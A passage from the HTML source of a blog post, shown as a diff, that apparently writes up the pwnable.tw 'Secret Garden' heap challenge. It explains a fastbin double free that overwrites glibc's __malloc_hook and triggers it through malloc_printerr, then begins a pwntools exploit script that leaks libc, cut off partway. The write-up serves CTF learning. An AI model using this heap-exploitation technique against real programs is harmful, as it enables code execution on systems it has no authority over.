-&lt;p&gt;Fortunately, there’s another way to trigger  &lt;code&gt;__malloc_hook&lt;/code&gt; : via  &lt;code&gt;malloc_printerr()&lt;/code&gt; . This function is used to print error message when  &lt;code&gt;malloc()&lt;/code&gt;  and  &lt;code&gt;free()&lt;/code&gt;  fails, and most importantly, it calls  &lt;code&gt;malloc()&lt;/code&gt; . Now back to our question, the easiest way to invoke  &lt;code&gt;malloc_printerr()&lt;/code&gt;  is to create a “double free or corruption (fasttop)” error [&lt;a href=&#34;#check-1-double-free-or-corruption-fasttop&#34;&gt;1&lt;/a&gt;] on purpose.&lt;/p&gt;
+&lt;h2 id=&#34;Triggering-our-malloc-hook&#34;&gt;&lt;a href=&#34;#Triggering-our-malloc-hook&#34; class=&#34;headerlink&#34; title=&#34;Triggering our __malloc_hook&#34;&gt;&lt;/a&gt;Triggering our __malloc_hook&lt;/h2&gt;&lt;p&gt;The last thing that will probably annoy you is that the constraints of all four one gadgets are unsatisfiable when &lt;code&gt;__malloc_hook&lt;/code&gt; is triggered via option 1, “raise a flower”.&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;one_gadget.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Fortunately, there’s another way to trigger &lt;code&gt;__malloc_hook&lt;/code&gt;: via &lt;code&gt;malloc_printerr()&lt;/code&gt;. This function is used to print error message when &lt;code&gt;malloc()&lt;/code&gt; and &lt;code&gt;free()&lt;/code&gt; fails, and most importantly, it calls &lt;code&gt;malloc()&lt;/code&gt;. Now back to our question, the easiest way to invoke &lt;code&gt;malloc_printerr()&lt;/code&gt; is to create a “double free or corruption (fasttop)” error [&lt;a href=&#34;#check-1-double-free-or-corruption-fasttop&#34;&gt;1&lt;/a&gt;] on purpose.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;chall.create(0x68)
 chall.create(0x68)
 chall.remove(4)
 chall.remove(5)
 chall.remove(4)
-chall.create(0x68, p64(libc_base + libc.sym[&#39;__malloc_hook&#39;] - 35))
+chall.create(0x68, p64(libc_base + libc.sym[&amp;#39;__malloc_hook&amp;#39;] - 35))
 chall.create(0x68)
 chall.create(0x68)
 
@@ -207,29 +204,124 @@ chall.create(0x68)
 chall.create(0x48)
 
 # Overwrite __malloc_hook.
-chall.create(0x68, 19 * b&#39;A&#39; + p64(libc_base + one_gadget))
+chall.create(0x68, 19 * b&amp;#39;A&amp;#39; + p64(libc_base + one_gadget))
 
 # Trigger &amp;quot;double free or corruption (fasttop)&amp;quot;.
 chall.remove(9)
 chall.remove(9)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h1 id=&#34;full-exploit-script&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#full-exploit-script&#34;&gt;#&lt;/a&gt; Full Exploit Script&lt;/h1&gt;
-&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# -*- encoding: utf-8 -*-&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;update&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arch &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;amd64&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; os &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;linux&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; log_level &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;elf  &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./secretgarden&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; checksec &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;./libc_64.so.6&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; checksec &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;one_gadget &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0xef6c4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;A8 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;A&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Challenge&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; proc&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;proc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; proc&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; len_name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; A8&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; color &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; A8&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#34;&#34;&#34; malloc(0x28), malloc(len_name) &#34;&#34;&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;proc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;choice : &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;proc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;name :&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;len_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;proc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;of flower :&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;proc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;the flower :&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; color&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;visit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;proc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;choice : &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;remove&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;proc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;choice : &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;3&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;proc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;garden:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;cleanup&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;proc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;choice : &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;4&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    proc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;chall.pwnable.tw&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10203&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Challenge&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;proc&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# Prepare a large chunk.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;create&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x420&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# Prevents the large chunk from being merged into the top chunk.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;create&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x38&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# Prevents the 0x430-byte chunk from being split.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;create&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remove&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# Free the 0x430-byte chunk into unsorted bin.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remove&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# Allocate the 0x430-byte chunk again so that visit() can print it.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;create&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x420&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;A&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;visit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    proc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;flower[3] :&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    leaked &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;proc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;\x00&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    offset &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x7fb7dafc4b0a&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x7fb7dac01000&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    libc_base &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; leaked &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; offset&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 